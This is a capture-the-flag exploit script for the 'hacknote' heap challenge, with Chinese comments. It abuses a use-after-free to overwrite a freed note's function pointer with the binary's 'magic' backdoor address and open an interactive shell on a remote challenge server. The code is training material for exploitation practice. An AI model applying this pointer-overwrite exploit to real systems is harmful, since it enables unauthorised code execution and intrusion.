import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./hacknote',
    remote='redirect.do-not-trust.hacking.run:10303',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def add(size, data):
    sla('Your choice :', '1')
    sla('Note size :', str(size))
    sla('Content :', data)


def delete(index):
    sla('Your choice :', '2')
    sla('Index :', str(index))


def printf(index):
    sla('Your choice :', '3')
    sla('Index :', str(index))

pause()
# 创建两个堆，然后释放，此时因为没有把指针置空
# 他们的地址会被继续使用
add(32, b'123')
add(32, b'123')
delete(0)
delete(1)
# 再次创建一个堆，将后门填进去，此时 data[0]将会重写为该后门
# 调用printf的时候会用data[0].printf == magic
shell_addr = elf.symbols['magic']
add(8, p00(shell_addr))
printf(0)
interactive()
